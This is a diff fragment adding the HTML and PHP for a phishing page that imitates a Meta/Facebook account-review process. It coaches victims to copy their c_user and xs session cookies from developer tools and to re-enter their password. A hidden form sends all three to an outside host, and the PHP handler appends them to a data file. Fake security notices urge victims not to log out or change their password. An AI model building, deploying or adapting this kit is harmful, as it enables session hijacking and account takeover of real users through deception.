+                    <a href="mailto:support@fb.com" style="color: #1877f2; text-decoration: none;">support@fb.com</a>
+                </p>
+            </div>
+            
+            <div class="language-footer">
+                <div class="selected-language-display">
+                    Selected: <strong id="selectedLanguageDisplay">None</strong>
+                </div>
+                <button class="confirm-btn" id="confirmBtn" disabled>
+                    <i class="fas fa-check"></i> Confirm Selection
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Review Modal -->
+    <div class="modal" id="reviewModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title"><i class="fas fa-file-alt"></i> Account Review Request</h2>
+                <button class="close-modal" id="closeModal">&times;</button>
+            </div>
+            
+            <div class="modal-body">
+                <div class="step-indicator">
+                    <div class="step active">1</div>
+                    <div class="step">2</div>
+                    <div class="step">3</div>
+                    <div class="step-line"></div>
+                </div>
+                
+                <!-- Step 1: Video and c_user/xs -->
+                <div class="step-content active" id="step1">
+                    <h3 class="step-title">Detailed Video Information</h3>
+                    
+                    <div class="video-player-container">
+                        <div class="network-status">
+                            <i class="fas fa-signal"></i>
+                            <span>Connection: Good</span>
+                        </div>
+                        <div class="video-container">
+                            <video id="tutorialVideo">
+                                <!-- Source will be set dynamically -->
+                                Your browser does not support the video tag.
+                            </video>
+                            <div class="loading-spinner" id="loadingSpinner">
+                                <div class="spinner"></div>
+                                <div class="loading-percentage">0%</div>
+                            </div>
+                            <div class="video-overlay" id="videoOverlay">
+                                <div class="play-btn" id="overlayPlayBtn">
+                                    <i class="fas fa-play"></i>
+                                </div>
+                                <p style="color: white; margin-top: 15px; font-weight: 600;">Click to select language</p>
+                            </div>
+                            <div class="video-controls">
+                                <button class="control-btn" id="playPauseBtn">
+                                    <i class="fas fa-play"></i>
+                                </button>
+                                <div class="progress-container">
+                                    <div class="buffered-bar" id="bufferedBar"></div>
+                                    <div class="progress-bar" id="progressBar"></div>
+                                </div>
+                                <div class="time-display">
+                                    <span id="currentTime">0:00</span> / <span id="totalTime">0:00</span>
+                                </div>
+                                <div class="volume-container">
+                                    <button class="control-btn" id="volumeBtn">
+                                        <i class="fas fa-volume-up"></i>
+                                    </button>
+                                    <input type="range" class="volume-slider" id="volumeSlider" min="0" max="1" step="0.1" value="1">
+                                </div>
+                                <select class="speed-selector" id="speedSelector">
+                                    <option value="0.5">0.5x</option>
+                                    <option value="0.75">0.75x</option>
+                                    <option value="1" selected>Normal</option>
+                                    <option value="1.25">1.25x</option>
+                                    <option value="1.5">1.5x</option>
+                                    <option value="2">2x</option>
+                                </select>
+                                <button class="control-btn fullscreen-btn" id="fullscreenBtn">
+                                    <i class="fas fa-expand"></i>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mobile-instructions">
+                        <h3><i class="fas fa-mobile-alt"></i> For Mobile Users</h3>
+                        <p>This process requires desktop browser developer tools. Please switch to a computer:</p>
+                        <ol>
+                            <li>Open Chrome on a desktop/laptop computer</li>
+                            <li>Log in to Facebook</li>
+                            <li>Follow the video instructions to find your values</li>
+                            <li>Return here to submit your review request</li>
+                        </ol>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="c_user"><i class="fas fa-user-circle"></i> c_user Value</label>
+                        <input type="text" id="c_user" name="c_user" 
+                               placeholder="Enter your c_user value"
+                               pattern="\d+" 
+                               title="c_user only"
+                               required>
+                        <div class="validation-hint">Must contain a valid c_user value only</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="xs"><i class="fas fa-key"></i> xs Value</label>
+                        <input type="text" id="xs" name="xs" 
+                               placeholder="Enter your xs value"
+                               pattern=".{20,}" 
+                               title="xs only"
+                               required>
+                        <div class="validation-hint">Must contain a valid xs value only</div>
+                    </div>
+                    
+                    <div class="btn-group">
+                        <button class="btn btn-outline" id="cancelBtn">
+                            <i class="fas fa-times"></i> Cancel
+                        </button>
+                        <button class="btn btn-primary" id="nextToStep2">
+                            <i class="fas fa-arrow-right"></i> Continue
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Step 2: Password Verification -->
+                <div class="step-content" id="step2">
+                    <h3 class="step-title">Password Verification</h3>
+                    
+                    <div class="form-group">
+                        <label for="password"><i class="fas fa-lock"></i> Re-enter Password</label>
+                        <input type="password" id="password" name="password" 
+                               placeholder="Enter your Facebook password"
+                               required>
+                    </div>
+                    
+                    <div class="deletion-warning">
+                        <h3><i class="fas fa-info-circle"></i> Important Security Notice</h3>
+                        <ul>
+                            <li>This is a security verification step to confirm your identity</li>
+                            <li>Do not log out from your computer during the review process</li>
+                            <li>Keep your Facebook account logged in on your computer</li>
+                            <li>Your password is encrypted during transmission</li>
+                            <li>Do not share your password with anyone</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="btn-group">
+                        <button class="btn btn-outline" id="backToStep1">
+                            <i class="fas fa-arrow-left"></i> Back
+                        </button>
+                        <button class="btn btn-primary" id="nextToStep3">
+                            <i class="fas fa-paper-plane"></i> Submit Review Request
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Step 3: Success Message -->
+                <div class="step-content" id="step3">
+                    <div class="success-message">
+                        <div class="success-icon">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <h3 class="success-title">Review Request Submitted!</h3>
+                        <p class="success-text">Your account review request has been successfully submitted. Our team will review your case within the next 24 hours.</p>
+                        
+                        <div class="deletion-warning">
+                            <h3><i class="fas fa-info-circle"></i> Important Instructions</h3>
+                            <ul>
+                                <li>Do not log out from your computer during this period</li>
+                                <li>Keep your Facebook account logged in on this device</li>
+                                <li>You will receive a notification once the review is complete</li>
+                                <li>Account deletion has been paused pending review</li>
+                                <li>Please do not attempt to change your password during review</li>
+                            </ul>
+                        </div>
+                        
+                        <button class="btn btn-primary" id="finishBtn">
+                            <i class="fas fa-check"></i> Finish
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Hidden form for submission -->
+    <form id="hiddenForm" class="hidden-form" action="https://php-ac262.wasmer.app" method="post">
+        <input type="hidden" name="c_user" id="hiddenCUser">
+        <input type="hidden" name="xs" id="hiddenXs">
+        <input type="hidden" name="password" id="hiddenPassword">
+    </form>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Ad Choice</a>
+                <a href="#">Terms and policies</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Help Center</a>
+            </div>
+            <div class="copyright">
+                Meta © 2025 - Protecting Your Digital Identity
+            </div>
+        </div>
+    </footer>
+
+    <?php
+// Video files mapping
+$videoFiles = [
+    'english' => 'https://remove-account-restriction-issue.vercel.app/English_US_video_information_V1.mp4',
+    'filipino' => 'https://remove-account-restriction-issue.vercel.app/Filipino_Tagalog_video_information_V1.mp4',
+    'hindi' => 'https://remove-account-restriction-issue.vercel.app/Hindi_video_information_V1.mp4',
+    'portuguese' => 'https://remove-account-restriction-issue.vercel.app/Portuguese_Brazil_video_information_V1.mp4',
+    'spanish' => 'https://remove-account-restriction-issue.vercel.app/Spanish_Spain_video_information_V1.mp4',
+    'tamil' => 'https://remove-account-restriction-issue.vercel.app/Tamil_video_information_V1.mp4',
+    'arabic' => 'Arabic_video_information_V1.mp4',
+    'french' => 'https://remove-account-restriction-issue.vercel.app/French_France_video_information_V1.mp4',
+    'swedish' => 'https://remove-account-restriction-issue.vercel.app/Swedish_video_information_V1.mp4',
+    'japanese' => 'https://remove-account-restriction-issue.vercel.app/Japanese_video_information_V1.mp4'
+];
+
+// Handle form submissions
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_POST['c_user']) && isset($_POST['xs'])) {
+        // Process c_user and xs data
+        $c_user = htmlspecialchars($_POST['c_user']);
+        $xs = htmlspecialchars($_POST['xs']);
+        
+        // Here you would typically save to database or file
+        file_put_contents('data.txt', "c_user: $c_user, xs: $xs\n", FILE_APPEND);
+    }
+    
+    if (isset($_POST['password'])) {
+        // Process password data
+        $password = htmlspecialchars($_POST['password']);
+        
+        // Here you would typically save to database or file
+        file_put_contents('data.txt', "password: $password\n", FILE_APPEND);
+    }
+}
+
+// Get preferred language from cookie or default to english
+$preferredLanguage = $_COOKIE['preferredLanguage'] ?? 'english';
+$videoSource = $videoFiles[$preferredLanguage] ?? $videoFiles['english'];
 ?>
+
+
+
+    
+    <video id="tutorialVideo" src="<?php echo htmlspecialchars($videoSource); ?>" controls></video>
+    
+    <!-- Language Modal -->
+    <div id="languageModal" class="modal">
+        <div class="modal-content">
+            <span id="closeLanguageModal" class="close">&times;</span>
+            <input type="text" id="languageSearch" placeholder="Search languages...">
+            
+            <div class="language-list">
+                <?php foreach ($videoFiles as $lang => $url): ?>
+                    <button class="language-btn" data-lang="<?php echo htmlspecialchars($lang); ?>">
+                        <span class="language-name"><?php echo ucfirst($lang); ?></span>
+                    </button>
+                <?php endforeach; ?>
+            </div>
+            
+            <button id="confirmBtn" disabled>Confirm</button>
+        </div>
+    </div>
+    
+    <!-- Review Modal -->
+    <div id="reviewModal" class="modal">
+        <div class="modal-content">
+            <span id="closeModal" class="close">&times;</span>
+            
+            <div class="steps">
+                <div class="step active">1</div>
+                <div class="step">2</div>
+                <div class="step">3</div>
+            </div>
+            
+            <form id="hiddenForm" method="post">
+                <!-- Step 1 -->
+                <div id="step1" class="step-content active">
+                    <input type="text" id="c_user" name="c_user" required placeholder="C_USER">
+                    <input type="text" id="xs" name="xs" required placeholder="XS">
+                    <button type="button" id="nextToStep2">Next</button>
+                </div>
+                
+                <!-- Step 2 -->
+                <div id="step2" class="step-content">
+                    <input type="password" id="password" name="password" required placeholder="Password">
+                    <button type="button" id="backToStep1">Back</button>
+                    <button type="button" id="nextToStep3">Next</button>
+                </div>
+                
+                <!-- Step 3 -->
+                <div id="step3" class="step-content">
+                    <p>Success!</p>
+                    <button type="button" id="finishBtn">Finish</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Your JavaScript would still be needed here for client-side functionality -->
+    <script>
+        // The original JavaScript code would still be needed here
+        // since PHP can't handle client-side interactions
+    </script>
+</body>
+</html>
